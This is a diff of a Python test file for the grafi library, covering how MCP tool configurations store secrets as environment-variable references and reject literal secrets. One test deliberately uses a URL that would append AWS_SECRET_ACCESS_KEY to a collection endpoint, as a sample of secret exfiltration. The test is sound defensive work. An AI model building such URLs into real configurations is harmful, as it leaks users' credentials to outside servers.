@@ -1,8 +1,8 @@
-"""Tests for MCP configurations that refer to secrets in the environment
-(grafi.common.models.mcp_connections)."""
+"""Tests for an MCP tool's configuration (grafi.tools.mcp_config): saved with
+its secrets as references to environment variables, never as values, and
+expanded when connecting."""
 
 import copy
-import re
 from typing import Any
 from typing import Dict
 
@@ -12,9 +12,10 @@ from pydantic import Field
 from pydantic_core import PydanticSerializationError
 
 from grafi.common.manifest import ManifestError
-from grafi.common.models.mcp_connections import MCPConfig
-from grafi.common.models.mcp_connections import check_mcp_secrets
-from grafi.common.models.mcp_connections import with_env
+from grafi.tools.function_calls.impl.mcp_tool import MCPTool
+from grafi.tools.mcp_config import MCPConfig
+from grafi.tools.mcp_config import check_mcp_secrets
+from grafi.tools.mcp_config import with_env
 
 
 class Server(BaseModel):
@@ -28,6 +29,17 @@ def _config(headers: Any = None, env: Any = None) -> Dict[str, Any]:
     if env is not None:
         connection["env"] = env
     return {"mcpServers": {"github": connection}}
+
+
+def _mcp_manifest(config: Dict[str, Any]) -> Dict[str, Any]:
+    return {
+        "apiVersion": "grafi/v2",
+        "kind": "Tool",
+        "spec": {
+            "class": "grafi.tools.function_calls.impl.mcp_tool:MCPTool",
+            "mcp_config": config,
+        },
+    }
 
 
 # --------------------------------------------------------------------------- #
@@ -80,25 +92,33 @@ def test_with_env_leaves_other_text_alone(
     monkeypatch.setenv("MCP_TOKEN", "t0ken")
 
     assert with_env({"value": text}) == {"value": text}
+    assert with_env(text) == text
 
 
-def _mcp_manifest(config: Dict[str, Any]) -> Dict[str, Any]:
-    return {
-        "apiVersion": "grafi/v2",
-        "kind": "Tool",
-        "spec": {
-            "class": "grafi.tools.function_calls.impl.mcp_tool:MCPTool",
-            "mcp_config": config,
-        },
-    }
+@pytest.mark.parametrize("value", [3, 30.0, True, None, ()])
+def test_with_env_leaves_values_that_are_not_text_alone(value: Any) -> None:
+    assert with_env(value) == value
+
+
+def test_with_env_raises_for_an_unset_variable(monkeypatch: pytest.MonkeyPatch) -> None:
+    monkeypatch.setenv("MCP_HOST", "mcp.example.com")
+    monkeypatch.delenv("MCP_MISSING_TOKEN", raising=False)
+    config = {"headers": [{"Authorization": "Bearer ${MCP_MISSING_TOKEN}"}]}
+    match = "The environment variable MCP_MISSING_TOKEN is referred to, but not set."
+
+    with pytest.raises(ValueError, match=match):
+        with_env(config)
+
+
+# --------------------------------------------------------------------------- #
+# A manifest reads only the variables it is allowed
+# --------------------------------------------------------------------------- #
 
 
 def test_a_manifest_reads_only_the_variables_it_is_allowed() -> None:
     """A connection loaded from a manifest cannot read a variable the
     application did not name, so it cannot send it to a server of its
     choosing; a connection written in code reads any."""
-    from grafi.tools.function_calls.impl.mcp_tool import MCPTool
-
     leak = "https://example.com/collect?leak=${AWS_SECRET_ACCESS_KEY}"
     config = {"mcpServers": {"s": {"transport": "http", "url": leak}}}
 
@@ -123,23 +143,12 @@ def test_a_manifest_reads_only_the_variables_it_is_allowed() -> None:
 def test_every_reference_in_a_manifest_must_be_allowed(
     connection: Dict[str, Any],
 ) -> None:
-    from grafi.tools.function_calls.impl.mcp_tool import MCPTool
-
     config = {"mcpServers": {"s": {"transport": "stdio", **connection}}}
 
     with pytest.raises(ManifestError, match=r"MCP_TEST_KEY.*env=\['MCP_TEST_KEY'\]"):
         MCPTool.from_manifest(_mcp_manifest(config))
     tool = MCPTool.from_manifest(_mcp_manifest(config), env=["MCP_TEST_KEY"])
     assert tool.mcp_config == config  # Kept as a reference, expanded on connecting.
-
-
-def test_with_env_raises_for_an_unset_variable(monkeypatch: pytest.MonkeyPatch) -> None:
-    monkeypatch.setenv("MCP_HOST", "mcp.example.com")
-    monkeypatch.delenv("MCP_MISSING_TOKEN", raising=False)
-    config = {"headers": [{"Authorization": "Bearer ${MCP_MISSING_TOKEN}"}]}
-
-    with pytest.raises(ValueError, match="MCP_MISSING_TOKEN, which is not set"):
-        with_env(config)
 
 
 # --------------------------------------------------------------------------- #
@@ -171,25 +180,33 @@ def test_secret_header_with_a_value_raises(name: str) -> None:
     ],
 )
 def test_secret_environment_variable_with_a_value_raises(name: str) -> None:
+    """The variable's name is reported: "env" is no secret's name."""
     with pytest.raises(ManifestError, match=_refused(name)):
         check_mcp_secrets(_config(env={name: "literal-secret"}))
 
 
+# The name reported is the outermost secret's (see grafi.common.secrets): the
+# header's or variable's, 'auth' for all within it, and 'url' for a URL's
+# password or secret parameter.
 @pytest.mark.parametrize(
     "connection, name",
     [
         ({"auth": "literal-token"}, "auth"),
+        ({"auth": {"oauth": {"client_secret": "literal"}}}, "auth"),
         ({"session_kwargs": {"auth": {"password": "pw"}}}, "auth"),
         ({"headers": [{"Authorization": "Bearer x"}]}, "Authorization"),
-        ({"url": "https://example.com/mcp?api_key=sk-1&page=2"}, "api_key"),
-        ({"url": "https://example.com/mcp?access_token=t0ken"}, "access_token"),
+        ({"command": "srv", "args": [{"password": "hunter2"}]}, "password"),
+        ({"url": "https://example.com/mcp?api_key=sk-1&page=2"}, "url"),
+        ({"url": "https://example.com/mcp?access_token=t0ken"}, "url"),
         ({"url": "https://bot:pw@example.com/mcp"}, "url"),
         ({"headers": {"Authorization": "Bearer sk ${GITHUB_TOKEN}"}}, "Authorization"),
     ],
     ids=[
         "auth",
+        "auth nested",
         "nested",
         "list",
+        "list of settings",
         "url api_key",
         "url access_token",
         "url password",
@@ -201,8 +218,9 @@ def test_secret_anywhere_in_a_connection_raises(
 ) -> None:
     config = {"mcpServers": {"github": {"transport": "http", **connection}}}
 
-    with pytest.raises(ManifestError, match=_refused(name)):
+    with pytest.raises(ManifestError, match=_refused(name)) as raised:
         check_mcp_secrets(config)
+    assert '"${VAR}"' in str(raised.value)  # It says how to refer to it.
 
 
 def test_secrets_given_as_references_are_saved() -> None:
@@ -251,6 +269,7 @@ def test_values_that_are_not_secrets_are_saved() -> None:
         {},
         {"mcpServers": {}},
         {"mcpServers": None},
+        {"mcpServers": ["not", "a", "mapping"]},
         _config(),
         _config(headers={}, env={}),
         {"mcpServers": {"local": {"command": "python", "env": None}}},
@@ -260,6 +279,11 @@ def test_values_that_are_not_secrets_are_saved() -> None:
 def test_configurations_without_secrets_are_saved(config: Dict[str, Any]) -> None:
     assert check_mcp_secrets(config) is None
     assert Server(mcp_config=config).model_dump(mode="json") == {"mcp_config": config}
+
+
+# --------------------------------------------------------------------------- #
+# MCPConfig: the field, as a tool holds it
+# --------------------------------------------------------------------------- #
 
 
 def test_mcp_config_field_saves_references_unexpanded(
@@ -286,8 +310,6 @@ def test_mcp_config_field_with_a_secret_value_cannot_be_saved_as_json() -> None:
 
 
 def test_mcp_tool_with_a_secret_value_cannot_be_saved() -> None:
-    from grafi.tools.function_calls.impl.mcp_tool import MCPTool
-
     tool = MCPTool(mcp_config=_config(env={"GITHUB_TOKEN": "ghp_literal"}))
 
     with pytest.raises(ManifestError, match=_refused("GITHUB_TOKEN")):
@@ -315,8 +337,6 @@ def test_mcp_tool_with_a_secret_value_cannot_be_saved() -> None:
 def test_a_manifest_never_gives_an_mcp_secret_as_a_value(
     connection: Dict[str, Any], match: str
 ) -> None:
-    from grafi.tools.function_calls.impl.mcp_tool import MCPTool
-
     config = {"mcpServers": {"github": {"transport": "http", **connection}}}
 
     with pytest.raises(ManifestError, match=match):
